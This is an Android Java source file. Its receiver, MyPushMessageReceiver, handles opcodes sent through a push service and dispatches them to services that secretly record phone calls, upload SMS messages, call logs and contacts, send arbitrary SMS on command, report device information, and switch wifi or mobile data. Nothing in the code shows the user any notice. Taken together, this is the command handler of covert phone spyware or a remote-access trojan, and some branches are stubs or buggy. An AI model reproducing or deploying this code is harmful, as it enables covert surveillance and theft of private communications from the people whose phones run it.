package com.imudges.zhw.push;

import org.json.JSONException;
import org.json.JSONObject;

import com.google.gson.JsonObject;
import com.imudges.ldj.servse.CallLogService;
import com.imudges.ldj.utils.WifiAdmin;
import com.imudges.ldj.utils.WifiResAbout;
import com.imudges.zhw.javabean.BaseInfo;
import com.imudges.zhw.slee.BatteryInfoBroadcastReceiver;
import com.imudges.zhw.slee.CallRecordService;
import com.imudges.zhw.slee.ProviderLookUpService;
import com.imudges.zhw.slee.ProviderSingleSMSService;
import com.imudges.zhw.slee.ProviderThreadSMSService;
import com.imudges.zhw.util.EnvironmentUtils;

import cn.bmob.push.PushConstants;
import cn.bmob.v3.BmobUser;
import cn.bmob.v3.listener.SaveListener;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

//推送必须要符合相关的代码
public class MyPushMessageReceiver extends BroadcastReceiver {
	private String opCode;// 操作代码
	private String explain;// 解释
	private String JsonString;// json对象
	private String[] opCodeArray;// 操作数组
	private EnvironmentUtils enu;
	public MyPushMessageReceiver() {
	}
	@Override
	public void onReceive(Context context, Intent intent) {
		enu = new EnvironmentUtils(context);
		String message = "";
		if (intent.getAction().equals(PushConstants.ACTION_MESSAGE)) {
			Log.d("bmob",
					"客户端收到推送内容："
							+ intent.getStringExtra(PushConstants.EXTRA_PUSH_MESSAGE_STRING));
			JSONObject js;
			try {
				js = new JSONObject(
						intent.getStringExtra(PushConstants.EXTRA_PUSH_MESSAGE_STRING));
				message = (String) js.get("alert");// 推送过来的代码
			} catch (JSONException e1) {
				e1.printStackTrace();
			}
			System.out.println("tuisong de xiaoxi :" + message);
			opCodeArray = message.split(" ");
			opCode = opCodeArray[0];
			explain = opCodeArray[1];
			JsonString = opCodeArray[2];
			System.out.println("opCode:" + opCode);
			System.out.println("explain:" + explain);
			System.out.println("JsonString:" + JsonString);
			Intent it;
			switch (opCode) {

			case "0001":// init Mode，开网，传信号电量等
				// 提交手机的基本信息
				enu.submitBaseInfo();
				// 开启电话录音
				Intent serviceIntent = new Intent(context,
						CallRecordService.class);
				context.startService(serviceIntent);
				// 开启监听短信

				break;
			case "1001":// 把准备好的短信Thread 上传
				Log.e("收到了", "1001");			
				context.startService(new Intent(context,
						ProviderThreadSMSService.class));
				// ContentProviderService cps = new ContentProviderService();
				break;
			case "1002":// 把准备好的短信记录 上传
				Log.e("收到了", "1002");
				it = new Intent(context, ProviderSingleSMSService.class);
				it.putExtra("threadId", explain);
				context.startService(it);
				break;
			case "1003":// 发送短信
				try {
					JSONObject dataJson = new JSONObject(JsonString);
					Log.i("phonenumber", dataJson.getString("phonenumber"));
					Log.i("phonenumber", dataJson.getString("content"));
					enu.sendSms(dataJson.getString("phonenumber"),
							dataJson.getString("content"));
				} catch (JSONException e) {
					e.printStackTrace();
				}
				break;
			case "1004":// 把准备好的通话记录上传。
				Log.e("收到了", "1004");
				it = new Intent(context, CallLogService.class);
				context.startService(it);
				break;
			case "1005":// 联系人上传
				Log.e("收到了", "1005");
				it = new Intent(context, ProviderLookUpService.class);
				context.startService(it);
				break;
			case "1010":// 文件管理
				break;
			case "1011":// 查看下一级目录 会传回了一个position
				break;
			case "1020":// 开关网。开wifi
				WifiAdmin mWifiAdmin = new WifiAdmin(context);
				if (explain.equals("open")) {
					mWifiAdmin.openWifi();
				} else {
					mWifiAdmin.closeWifi();
				}
				break;
			case "1025":// 开数据
				if (explain.equals("open")) {
					enu.closeGprs();
				} else {
					enu.closeGprs();
				}
				;
				break;
			case "":
				break;
			}
		}
	}
}

// 这是让手机通知栏相应的代码
/*
 * NotificationManager nm = (NotificationManager) context
 * .getSystemService(Context.NOTIFICATION_SERVICE); Notification n = new
 * Notification(); n.icon = R.drawable.ic_launcher; n.tickerText = "收到推送的消息了";
 * n.when = System.currentTimeMillis(); //
 * n.flags=Notification.FLAG_ONGOING_EVENT; Intent it = new Intent(context,
 * MainActivity.class); PendingIntent pi = PendingIntent.getActivity(context, 0,
 * it, 0); n.setLatestEventInfo(context, "消息", message, pi); n.defaults |=
 * Notification.DEFAULT_SOUND; n.flags = Notification.FLAG_AUTO_CANCEL;
 * nm.notify(1, n);
 */
